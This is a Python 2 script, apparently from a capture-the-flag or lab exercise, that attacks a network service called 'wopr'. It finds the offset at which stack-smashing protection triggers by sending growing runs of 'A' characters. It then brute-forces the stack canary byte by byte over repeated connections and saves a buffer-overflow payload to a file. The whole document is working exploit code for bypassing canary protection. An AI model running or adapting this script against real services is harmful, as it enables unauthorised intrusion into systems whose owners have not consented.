#!/usr/bin/env python
import socket, time, sys

#declare globals
global target
global port
global eipoffset
global canarysize
canaryOffset = 0
canaryValue = ""

#this function sends a request to the wopr service (crudely) and receives the response
def sendRequest(target, port, payload):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
				s.connect((target, port))
				done = False
				while done == False:
					response=s.recv(1024)
					if ">" in response:
						s.send(payload)
						result = ""
						result =  s.recv(1024)
						result = result.strip() +  s.recv(1024)
						result = result.strip()
						return result
	except Exception, err:
				print Exception, err

#find canary offset by trying one A at a time until we hit the stack smash protection
def getCanaryOffset():
	for i in range(1,eipoffset):
			payload = "A"*i
			result = sendRequest(target,port,payload)
			if "bye" not in result:
				#we remove one from the result because the integer
				#is the first time hit the SSP
				offset=i-1 
				print "[+] Canary found at offset: " + str(offset)
				return offset
	
				
def bruteForceCanary(offset, length):
	canary = "" 
	#use the specified canary length  
	for byte in xrange(length):
		#try this many bytes for the canary
		#this code just generates the bytes 0-255 and converts them to characters
		for canary_byte in xrange(256):
			hex_byte = chr(canary_byte)
			#build up the payload using our predicted offset and brute force
			#the canary one byte at a time
			payload="A"*offset + canary + hex_byte
			result = sendRequest(target,port,payload)
			#if the canary byte was correct then "bye" is returned in the response
			if "bye" in result:
				canary += hex_byte
				break
	return canary


if len(sys.argv) < 4:
	print "[-] usage: python get_canary.py [ip] [port] [eip-offset] [canary-size]"
	exit(0)
else:
	target = sys.argv[1]
	port = int(sys.argv[2])
	eipoffset = int(sys.argv[3])
	canarysize = int(sys.argv[4])
	
	canaryOffset = getCanaryOffset()
	payload = bruteForceCanary(canaryOffset,canarysize)
	print "[+] Saving payload to payload.txt"
	fp = open("payload.txt", "w")
	fp.write("A"*canaryOffset + payload)
	fp.close()
